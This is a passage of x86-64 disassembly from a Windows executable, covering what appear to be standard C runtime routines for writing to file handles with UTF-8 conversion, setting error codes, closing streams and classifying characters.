   14000b1c7:	44 8b c8             	mov    %eax,%r9d
   14000b1ca:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   14000b1cf:	33 d2                	xor    %edx,%edx
   14000b1d1:	e8 02 be ff ff       	call   0x140006fd8
   14000b1d6:	8b e8                	mov    %eax,%ebp
   14000b1d8:	85 c0                	test   %eax,%eax
   14000b1da:	74 49                	je     0x14000b225
   14000b1dc:	33 f6                	xor    %esi,%esi
   14000b1de:	85 c0                	test   %eax,%eax
   14000b1e0:	74 33                	je     0x14000b215
   14000b1e2:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000b1e8:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   14000b1ef:	00 
   14000b1f0:	8b ce                	mov    %esi,%ecx
   14000b1f2:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000b1f7:	44 8b c5             	mov    %ebp,%r8d
   14000b1fa:	48 03 d1             	add    %rcx,%rdx
   14000b1fd:	49 8b cc             	mov    %r12,%rcx
   14000b200:	44 2b c6             	sub    %esi,%r8d
   14000b203:	ff 15 f7 2e 00 00    	call   *0x2ef7(%rip)        # 0x14000e100
   14000b209:	85 c0                	test   %eax,%eax
   14000b20b:	74 18                	je     0x14000b225
   14000b20d:	03 74 24 40          	add    0x40(%rsp),%esi
   14000b211:	3b f5                	cmp    %ebp,%esi
   14000b213:	72 cd                	jb     0x14000b1e2
   14000b215:	8b c7                	mov    %edi,%eax
   14000b217:	41 2b c7             	sub    %r15d,%eax
   14000b21a:	89 43 04             	mov    %eax,0x4(%rbx)
   14000b21d:	49 3b fe             	cmp    %r14,%rdi
   14000b220:	e9 34 ff ff ff       	jmp    0x14000b159
   14000b225:	ff 15 65 2e 00 00    	call   *0x2e65(%rip)        # 0x14000e090
   14000b22b:	89 03                	mov    %eax,(%rbx)
   14000b22d:	48 8b c3             	mov    %rbx,%rax
   14000b230:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   14000b237:	00 
   14000b238:	48 33 cc             	xor    %rsp,%rcx
   14000b23b:	e8 b0 21 00 00       	call   0x14000d3f0
   14000b240:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   14000b247:	00 
   14000b248:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000b24c:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   14000b250:	49 8b e3             	mov    %r11,%rsp
   14000b253:	41 5f                	pop    %r15
   14000b255:	41 5e                	pop    %r14
   14000b257:	41 5c                	pop    %r12
   14000b259:	5f                   	pop    %rdi
   14000b25a:	5e                   	pop    %rsi
   14000b25b:	c3                   	ret
   14000b25c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b261:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b266:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000b26a:	57                   	push   %rdi
   14000b26b:	41 54                	push   %r12
   14000b26d:	41 55                	push   %r13
   14000b26f:	41 56                	push   %r14
   14000b271:	41 57                	push   %r15
   14000b273:	48 83 ec 20          	sub    $0x20,%rsp
   14000b277:	45 8b f0             	mov    %r8d,%r14d
   14000b27a:	4c 8b fa             	mov    %rdx,%r15
   14000b27d:	48 63 d9             	movslq %ecx,%rbx
   14000b280:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000b283:	75 18                	jne    0x14000b29d
   14000b285:	e8 16 a5 ff ff       	call   0x1400057a0
   14000b28a:	83 20 00             	andl   $0x0,(%rax)
   14000b28d:	e8 2e a5 ff ff       	call   0x1400057c0
   14000b292:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b298:	e9 8f 00 00 00       	jmp    0x14000b32c
   14000b29d:	85 c9                	test   %ecx,%ecx
   14000b29f:	78 73                	js     0x14000b314
   14000b2a1:	3b 1d a9 d1 00 00    	cmp    0xd1a9(%rip),%ebx        # 0x140018450
   14000b2a7:	73 6b                	jae    0x14000b314
   14000b2a9:	48 8b c3             	mov    %rbx,%rax
   14000b2ac:	48 8b f3             	mov    %rbx,%rsi
   14000b2af:	48 c1 fe 06          	sar    $0x6,%rsi
   14000b2b3:	4c 8d 2d 96 cd 00 00 	lea    0xcd96(%rip),%r13        # 0x140018050
   14000b2ba:	83 e0 3f             	and    $0x3f,%eax
   14000b2bd:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   14000b2c1:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000b2c6:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000b2cc:	74 46                	je     0x14000b314
   14000b2ce:	8b cb                	mov    %ebx,%ecx
   14000b2d0:	e8 5b c5 ff ff       	call   0x140007830
   14000b2d5:	83 cf ff             	or     $0xffffffff,%edi
   14000b2d8:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   14000b2dd:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   14000b2e3:	75 15                	jne    0x14000b2fa
   14000b2e5:	e8 d6 a4 ff ff       	call   0x1400057c0
   14000b2ea:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b2f0:	e8 ab a4 ff ff       	call   0x1400057a0
   14000b2f5:	83 20 00             	andl   $0x0,(%rax)
   14000b2f8:	eb 0f                	jmp    0x14000b309
   14000b2fa:	45 8b c6             	mov    %r14d,%r8d
   14000b2fd:	49 8b d7             	mov    %r15,%rdx
   14000b300:	8b cb                	mov    %ebx,%ecx
   14000b302:	e8 41 00 00 00       	call   0x14000b348
   14000b307:	8b f8                	mov    %eax,%edi
   14000b309:	8b cb                	mov    %ebx,%ecx
   14000b30b:	e8 48 c5 ff ff       	call   0x140007858
   14000b310:	8b c7                	mov    %edi,%eax
   14000b312:	eb 1b                	jmp    0x14000b32f
   14000b314:	e8 87 a4 ff ff       	call   0x1400057a0
   14000b319:	83 20 00             	andl   $0x0,(%rax)
   14000b31c:	e8 9f a4 ff ff       	call   0x1400057c0
   14000b321:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b327:	e8 74 a3 ff ff       	call   0x1400056a0
   14000b32c:	83 c8 ff             	or     $0xffffffff,%eax
   14000b32f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000b334:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000b339:	48 83 c4 20          	add    $0x20,%rsp
   14000b33d:	41 5f                	pop    %r15
   14000b33f:	41 5e                	pop    %r14
   14000b341:	41 5d                	pop    %r13
   14000b343:	41 5c                	pop    %r12
   14000b345:	5f                   	pop    %rdi
   14000b346:	c3                   	ret
   14000b347:	cc                   	int3
   14000b348:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b34d:	55                   	push   %rbp
   14000b34e:	56                   	push   %rsi
   14000b34f:	57                   	push   %rdi
   14000b350:	41 54                	push   %r12
   14000b352:	41 55                	push   %r13
   14000b354:	41 56                	push   %r14
   14000b356:	41 57                	push   %r15
   14000b358:	48 8b ec             	mov    %rsp,%rbp
   14000b35b:	48 83 ec 60          	sub    $0x60,%rsp
   14000b35f:	33 db                	xor    %ebx,%ebx
   14000b361:	45 8b f0             	mov    %r8d,%r14d
   14000b364:	4c 63 e1             	movslq %ecx,%r12
   14000b367:	48 8b fa             	mov    %rdx,%rdi
   14000b36a:	45 85 c0             	test   %r8d,%r8d
   14000b36d:	0f 84 9e 02 00 00    	je     0x14000b611
   14000b373:	48 85 d2             	test   %rdx,%rdx
   14000b376:	75 1f                	jne    0x14000b397
   14000b378:	e8 23 a4 ff ff       	call   0x1400057a0
   14000b37d:	89 18                	mov    %ebx,(%rax)
   14000b37f:	e8 3c a4 ff ff       	call   0x1400057c0
   14000b384:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b38a:	e8 11 a3 ff ff       	call   0x1400056a0
   14000b38f:	83 c8 ff             	or     $0xffffffff,%eax
   14000b392:	e9 7c 02 00 00       	jmp    0x14000b613
   14000b397:	49 8b c4             	mov    %r12,%rax
   14000b39a:	48 8d 0d af cc 00 00 	lea    0xccaf(%rip),%rcx        # 0x140018050
   14000b3a1:	83 e0 3f             	and    $0x3f,%eax
   14000b3a4:	4d 8b ec             	mov    %r12,%r13
   14000b3a7:	49 c1 fd 06          	sar    $0x6,%r13
   14000b3ab:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   14000b3af:	4a 8b 0c e9          	mov    (%rcx,%r13,8),%rcx
   14000b3b3:	42 0f be 74 f9 39    	movsbl 0x39(%rcx,%r15,8),%esi
   14000b3b9:	8d 46 ff             	lea    -0x1(%rsi),%eax
   14000b3bc:	3c 01                	cmp    $0x1,%al
   14000b3be:	77 09                	ja     0x14000b3c9
   14000b3c0:	41 8b c6             	mov    %r14d,%eax
   14000b3c3:	f7 d0                	not    %eax
   14000b3c5:	a8 01                	test   $0x1,%al
   14000b3c7:	74 af                	je     0x14000b378
   14000b3c9:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   14000b3cf:	74 0e                	je     0x14000b3df
   14000b3d1:	33 d2                	xor    %edx,%edx
   14000b3d3:	41 8b cc             	mov    %r12d,%ecx
   14000b3d6:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000b3da:	e8 8d 0b 00 00       	call   0x14000bf6c
   14000b3df:	41 8b cc             	mov    %r12d,%ecx
   14000b3e2:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   14000b3e6:	e8 35 03 00 00       	call   0x14000b720
   14000b3eb:	85 c0                	test   %eax,%eax
   14000b3ed:	0f 84 0b 01 00 00    	je     0x14000b4fe
   14000b3f3:	48 8d 05 56 cc 00 00 	lea    0xcc56(%rip),%rax        # 0x140018050
   14000b3fa:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000b3fe:	42 38 5c f8 38       	cmp    %bl,0x38(%rax,%r15,8)
   14000b403:	0f 8d f5 00 00 00    	jge    0x14000b4fe
   14000b409:	e8 d6 9d ff ff       	call   0x1400051e4
   14000b40e:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000b415:	48 39 99 38 01 00 00 	cmp    %rbx,0x138(%rcx)
   14000b41c:	75 16                	jne    0x14000b434
   14000b41e:	48 8d 05 2b cc 00 00 	lea    0xcc2b(%rip),%rax        # 0x140018050
   14000b425:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000b429:	42 38 5c f8 39       	cmp    %bl,0x39(%rax,%r15,8)
   14000b42e:	0f 84 ca 00 00 00    	je     0x14000b4fe
   14000b434:	48 8d 05 15 cc 00 00 	lea    0xcc15(%rip),%rax        # 0x140018050
   14000b43b:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000b43f:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   14000b443:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000b448:	ff 15 b2 2d 00 00    	call   *0x2db2(%rip)        # 0x14000e200
   14000b44e:	85 c0                	test   %eax,%eax
   14000b450:	0f 84 a8 00 00 00    	je     0x14000b4fe
   14000b456:	40 84 f6             	test   %sil,%sil
   14000b459:	0f 84 81 00 00 00    	je     0x14000b4e0
   14000b45f:	40 fe ce             	dec    %sil
   14000b462:	40 80 fe 01          	cmp    $0x1,%sil
   14000b466:	0f 87 2e 01 00 00    	ja     0x14000b59a
   14000b46c:	4e 8d 24 37          	lea    (%rdi,%r14,1),%r12
   14000b470:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   14000b474:	4c 8b f7             	mov    %rdi,%r14
   14000b477:	49 3b fc             	cmp    %r12,%rdi
   14000b47a:	0f 83 10 01 00 00    	jae    0x14000b590
   14000b480:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   14000b483:	41 0f b7 06          	movzwl (%r14),%eax
   14000b487:	0f b7 c8             	movzwl %ax,%ecx
   14000b48a:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   14000b48e:	e8 e1 0a 00 00       	call   0x14000bf74
   14000b493:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   14000b497:	66 3b c1             	cmp    %cx,%ax
   14000b49a:	75 36                	jne    0x14000b4d2
   14000b49c:	83 c6 02             	add    $0x2,%esi
   14000b49f:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000b4a2:	66 83 f9 0a          	cmp    $0xa,%cx
   14000b4a6:	75 1b                	jne    0x14000b4c3
   14000b4a8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000b4ad:	e8 c2 0a 00 00       	call   0x14000bf74
   14000b4b2:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000b4b7:	66 3b c1             	cmp    %cx,%ax
   14000b4ba:	75 16                	jne    0x14000b4d2
   14000b4bc:	ff c6                	inc    %esi
   14000b4be:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   14000b4c1:	ff c3                	inc    %ebx
   14000b4c3:	49 83 c6 02          	add    $0x2,%r14
   14000b4c7:	4d 3b f4             	cmp    %r12,%r14
   14000b4ca:	0f 83 c0 00 00 00    	jae    0x14000b590
   14000b4d0:	eb b1                	jmp    0x14000b483
   14000b4d2:	ff 15 b8 2b 00 00    	call   *0x2bb8(%rip)        # 0x14000e090
   14000b4d8:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000b4db:	e9 b0 00 00 00       	jmp    0x14000b590
   14000b4e0:	45 8b ce             	mov    %r14d,%r9d
   14000b4e3:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b4e7:	4c 8b c7             	mov    %rdi,%r8
   14000b4ea:	41 8b d4             	mov    %r12d,%edx
   14000b4ed:	e8 ee f4 ff ff       	call   0x14000a9e0
   14000b4f2:	f2 0f 10 00          	movsd  (%rax),%xmm0
   14000b4f6:	8b 58 08             	mov    0x8(%rax),%ebx
   14000b4f9:	e9 97 00 00 00       	jmp    0x14000b595
   14000b4fe:	48 8d 05 4b cb 00 00 	lea    0xcb4b(%rip),%rax        # 0x140018050
   14000b505:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   14000b509:	42 38 5c f9 38       	cmp    %bl,0x38(%rcx,%r15,8)
   14000b50e:	7d 4d                	jge    0x14000b55d
   14000b510:	8b ce                	mov    %esi,%ecx
   14000b512:	40 84 f6             	test   %sil,%sil
   14000b515:	74 32                	je     0x14000b549
   14000b517:	83 e9 01             	sub    $0x1,%ecx
   14000b51a:	74 19                	je     0x14000b535
   14000b51c:	83 f9 01             	cmp    $0x1,%ecx
   14000b51f:	75 79                	jne    0x14000b59a
   14000b521:	45 8b ce             	mov    %r14d,%r9d
   14000b524:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b528:	4c 8b c7             	mov    %rdi,%r8
   14000b52b:	41 8b d4             	mov    %r12d,%edx
   14000b52e:	e8 9d fa ff ff       	call   0x14000afd0
   14000b533:	eb bd                	jmp    0x14000b4f2
   14000b535:	45 8b ce             	mov    %r14d,%r9d
   14000b538:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b53c:	4c 8b c7             	mov    %rdi,%r8
   14000b53f:	41 8b d4             	mov    %r12d,%edx
   14000b542:	e8 a5 fb ff ff       	call   0x14000b0ec
   14000b547:	eb a9                	jmp    0x14000b4f2
   14000b549:	45 8b ce             	mov    %r14d,%r9d
   14000b54c:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000b550:	4c 8b c7             	mov    %rdi,%r8
   14000b553:	41 8b d4             	mov    %r12d,%edx
   14000b556:	e8 71 f9 ff ff       	call   0x14000aecc
   14000b55b:	eb 95                	jmp    0x14000b4f2
   14000b55d:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   14000b562:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000b566:	33 c0                	xor    %eax,%eax
   14000b568:	45 8b c6             	mov    %r14d,%r8d
   14000b56b:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   14000b570:	48 8b d7             	mov    %rdi,%rdx
   14000b573:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   14000b577:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000b57a:	ff 15 80 2b 00 00    	call   *0x2b80(%rip)        # 0x14000e100
   14000b580:	85 c0                	test   %eax,%eax
   14000b582:	75 09                	jne    0x14000b58d
   14000b584:	ff 15 06 2b 00 00    	call   *0x2b06(%rip)        # 0x14000e090
   14000b58a:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000b58d:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   14000b590:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   14000b595:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   14000b59a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000b59e:	48 c1 e8 20          	shr    $0x20,%rax
   14000b5a2:	85 c0                	test   %eax,%eax
   14000b5a4:	75 64                	jne    0x14000b60a
   14000b5a6:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000b5a9:	85 c0                	test   %eax,%eax
   14000b5ab:	74 2d                	je     0x14000b5da
   14000b5ad:	83 f8 05             	cmp    $0x5,%eax
   14000b5b0:	75 1b                	jne    0x14000b5cd
   14000b5b2:	e8 09 a2 ff ff       	call   0x1400057c0
   14000b5b7:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b5bd:	e8 de a1 ff ff       	call   0x1400057a0
   14000b5c2:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   14000b5c8:	e9 c2 fd ff ff       	jmp    0x14000b38f
   14000b5cd:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000b5d0:	e8 7b a1 ff ff       	call   0x140005750
   14000b5d5:	e9 b5 fd ff ff       	jmp    0x14000b38f
   14000b5da:	48 8d 05 6f ca 00 00 	lea    0xca6f(%rip),%rax        # 0x140018050
   14000b5e1:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   14000b5e5:	42 f6 44 f8 38 40    	testb  $0x40,0x38(%rax,%r15,8)
   14000b5eb:	74 05                	je     0x14000b5f2
   14000b5ed:	80 3f 1a             	cmpb   $0x1a,(%rdi)
   14000b5f0:	74 1f                	je     0x14000b611
   14000b5f2:	e8 c9 a1 ff ff       	call   0x1400057c0
   14000b5f7:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   14000b5fd:	e8 9e a1 ff ff       	call   0x1400057a0
   14000b602:	83 20 00             	andl   $0x0,(%rax)
   14000b605:	e9 85 fd ff ff       	jmp    0x14000b38f
   14000b60a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000b60d:	2b c3                	sub    %ebx,%eax
   14000b60f:	eb 02                	jmp    0x14000b613
   14000b611:	33 c0                	xor    %eax,%eax
   14000b613:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   14000b61a:	00 
   14000b61b:	48 83 c4 60          	add    $0x60,%rsp
   14000b61f:	41 5f                	pop    %r15
   14000b621:	41 5e                	pop    %r14
   14000b623:	41 5d                	pop    %r13
   14000b625:	41 5c                	pop    %r12
   14000b627:	5f                   	pop    %rdi
   14000b628:	5e                   	pop    %rsi
   14000b629:	5d                   	pop    %rbp
   14000b62a:	c3                   	ret
   14000b62b:	cc                   	int3
   14000b62c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b631:	57                   	push   %rdi
   14000b632:	48 83 ec 30          	sub    $0x30,%rsp
   14000b636:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000b63b:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000b640:	e8 9f bf ff ff       	call   0x1400075e4
   14000b645:	90                   	nop
   14000b646:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000b64b:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000b64f:	3b 1d f3 cf 00 00    	cmp    0xcff3(%rip),%ebx        # 0x140018648
   14000b655:	74 6d                	je     0x14000b6c4
   14000b657:	48 63 fb             	movslq %ebx,%rdi
   14000b65a:	48 8b 05 ef cf 00 00 	mov    0xcfef(%rip),%rax        # 0x140018650
   14000b661:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b665:	48 85 c9             	test   %rcx,%rcx
   14000b668:	75 02                	jne    0x14000b66c
   14000b66a:	eb 54                	jmp    0x14000b6c0
   14000b66c:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b66f:	c1 e8 0d             	shr    $0xd,%eax
   14000b672:	a8 01                	test   $0x1,%al
   14000b674:	74 19                	je     0x14000b68f
   14000b676:	48 8b 0d d3 cf 00 00 	mov    0xcfd3(%rip),%rcx        # 0x140018650
   14000b67d:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b681:	e8 ae 09 00 00       	call   0x14000c034
   14000b686:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b689:	74 04                	je     0x14000b68f
   14000b68b:	ff 44 24 20          	incl   0x20(%rsp)
   14000b68f:	48 8b 05 ba cf 00 00 	mov    0xcfba(%rip),%rax        # 0x140018650
   14000b696:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b69a:	48 83 c1 30          	add    $0x30,%rcx
   14000b69e:	ff 15 14 2a 00 00    	call   *0x2a14(%rip)        # 0x14000e0b8
   14000b6a4:	48 8b 0d a5 cf 00 00 	mov    0xcfa5(%rip),%rcx        # 0x140018650
   14000b6ab:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b6af:	e8 a4 a1 ff ff       	call   0x140005858
   14000b6b4:	48 8b 05 95 cf 00 00 	mov    0xcf95(%rip),%rax        # 0x140018650
   14000b6bb:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000b6c0:	ff c3                	inc    %ebx
   14000b6c2:	eb 87                	jmp    0x14000b64b
   14000b6c4:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000b6c9:	e8 6a bf ff ff       	call   0x140007638
   14000b6ce:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000b6d2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b6d7:	48 83 c4 30          	add    $0x30,%rsp
   14000b6db:	5f                   	pop    %rdi
   14000b6dc:	c3                   	ret
   14000b6dd:	cc                   	int3
   14000b6de:	cc                   	int3
   14000b6df:	cc                   	int3
   14000b6e0:	40 53                	rex push %rbx
   14000b6e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000b6e6:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b6e9:	48 8b d9             	mov    %rcx,%rbx
   14000b6ec:	c1 e8 0d             	shr    $0xd,%eax
   14000b6ef:	a8 01                	test   $0x1,%al
   14000b6f1:	74 27                	je     0x14000b71a
   14000b6f3:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b6f6:	c1 e8 06             	shr    $0x6,%eax
   14000b6f9:	a8 01                	test   $0x1,%al
   14000b6fb:	74 1d                	je     0x14000b71a
   14000b6fd:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000b701:	e8 52 a1 ff ff       	call   0x140005858
   14000b706:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000b70d:	ff 
   14000b70e:	33 c0                	xor    %eax,%eax
   14000b710:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000b714:	48 89 03             	mov    %rax,(%rbx)
   14000b717:	89 43 10             	mov    %eax,0x10(%rbx)
   14000b71a:	48 83 c4 20          	add    $0x20,%rsp
   14000b71e:	5b                   	pop    %rbx
   14000b71f:	c3                   	ret
   14000b720:	48 83 ec 28          	sub    $0x28,%rsp
   14000b724:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000b727:	75 0d                	jne    0x14000b736
   14000b729:	e8 92 a0 ff ff       	call   0x1400057c0
   14000b72e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b734:	eb 42                	jmp    0x14000b778
   14000b736:	85 c9                	test   %ecx,%ecx
   14000b738:	78 2e                	js     0x14000b768
   14000b73a:	3b 0d 10 cd 00 00    	cmp    0xcd10(%rip),%ecx        # 0x140018450
   14000b740:	73 26                	jae    0x14000b768
   14000b742:	48 63 c9             	movslq %ecx,%rcx
   14000b745:	48 8d 15 04 c9 00 00 	lea    0xc904(%rip),%rdx        # 0x140018050
   14000b74c:	48 8b c1             	mov    %rcx,%rax
   14000b74f:	83 e1 3f             	and    $0x3f,%ecx
   14000b752:	48 c1 f8 06          	sar    $0x6,%rax
   14000b756:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000b75a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000b75e:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000b763:	83 e0 40             	and    $0x40,%eax
   14000b766:	eb 12                	jmp    0x14000b77a
   14000b768:	e8 53 a0 ff ff       	call   0x1400057c0
   14000b76d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b773:	e8 28 9f ff ff       	call   0x1400056a0
   14000b778:	33 c0                	xor    %eax,%eax
   14000b77a:	48 83 c4 28          	add    $0x28,%rsp
   14000b77e:	c3                   	ret
   14000b77f:	cc                   	int3
   14000b780:	40 53                	rex push %rbx
   14000b782:	48 83 ec 40          	sub    $0x40,%rsp
   14000b786:	48 63 d9             	movslq %ecx,%rbx
   14000b789:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b78e:	e8 81 95 ff ff       	call   0x140004d14
   14000b793:	8d 43 01             	lea    0x1(%rbx),%eax
   14000b796:	3d 00 01 00 00       	cmp    $0x100,%eax
   14000b79b:	77 13                	ja     0x14000b7b0
   14000b79d:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000b7a2:	48 8b 08             	mov    (%rax),%rcx
   14000b7a5:	0f b7 04 59          	movzwl (%rcx,%rbx,2),%eax
   14000b7a9:	25 00 80 00 00       	and    $0x8000,%eax
   14000b7ae:	eb 02                	jmp    0x14000b7b2
   14000b7b0:	33 c0                	xor    %eax,%eax
   14000b7b2:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000b7b7:	74 0c                	je     0x14000b7c5
   14000b7b9:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b7be:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b7c5:	48 83 c4 40          	add    $0x40,%rsp
   14000b7c9:	5b                   	pop    %rbx
   14000b7ca:	c3                   	ret
   14000b7cb:	cc                   	int3
   14000b7cc:	40 53                	rex push %rbx
   14000b7ce:	48 83 ec 30          	sub    $0x30,%rsp
   14000b7d2:	48 8b d9             	mov    %rcx,%rbx
   14000b7d5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b7da:	e8 b9 08 00 00       	call   0x14000c098
   14000b7df:	48 83 f8 04          	cmp    $0x4,%rax
   14000b7e3:	77 1a                	ja     0x14000b7ff
   14000b7e5:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000b7e9:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000b7ee:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000b7f4:	0f 47 d1             	cmova  %ecx,%edx
   14000b7f7:	48 85 db             	test   %rbx,%rbx
   14000b7fa:	74 03                	je     0x14000b7ff
   14000b7fc:	66 89 13             	mov    %dx,(%rbx)
   14000b7ff:	48 83 c4 30          	add    $0x30,%rsp
   14000b803:	5b                   	pop    %rbx
   14000b804:	c3                   	ret
   14000b805:	cc                   	int3
   14000b806:	cc                   	int3
   14000b807:	cc                   	int3
   14000b808:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b80d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b812:	57                   	push   %rdi
   14000b813:	41 54                	push   %r12
   14000b815:	41 55                	push   %r13
   14000b817:	41 56                	push   %r14
   14000b819:	41 57                	push   %r15
   14000b81b:	48 83 ec 20          	sub    $0x20,%rsp
   14000b81f:	48 8b 3a             	mov    (%rdx),%rdi
   14000b822:	45 33 ed             	xor    %r13d,%r13d
   14000b825:	4d 8b e1             	mov    %r9,%r12
   14000b828:	49 8b e8             	mov    %r8,%rbp
   14000b82b:	4c 8b f2             	mov    %rdx,%r14
   14000b82e:	4c 8b f9             	mov    %rcx,%r15
   14000b831:	48 85 c9             	test   %rcx,%rcx
   14000b834:	0f 84 ee 00 00 00    	je     0x14000b928
   14000b83a:	48 8b d9             	mov    %rcx,%rbx
   14000b83d:	4d 85 c0             	test   %r8,%r8
   14000b840:	0f 84 a1 00 00 00    	je     0x14000b8e7
   14000b846:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b849:	75 08                	jne    0x14000b853
   14000b84b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b851:	eb 1d                	jmp    0x14000b870
   14000b853:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b857:	75 08                	jne    0x14000b861
   14000b859:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b85f:	eb 0f                	jmp    0x14000b870
   14000b861:	8a 47 02             	mov    0x2(%rdi),%al
   14000b864:	f6 d8                	neg    %al
   14000b866:	4d 1b c0             	sbb    %r8,%r8
   14000b869:	49 f7 d8             	neg    %r8
   14000b86c:	49 83 c0 03          	add    $0x3,%r8
   14000b870:	4d 8b cc             	mov    %r12,%r9
   14000b873:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000b878:	48 8b d7             	mov    %rdi,%rdx
   14000b87b:	e8 18 08 00 00       	call   0x14000c098
   14000b880:	48 8b d0             	mov    %rax,%rdx
   14000b883:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b887:	74 75                	je     0x14000b8fe
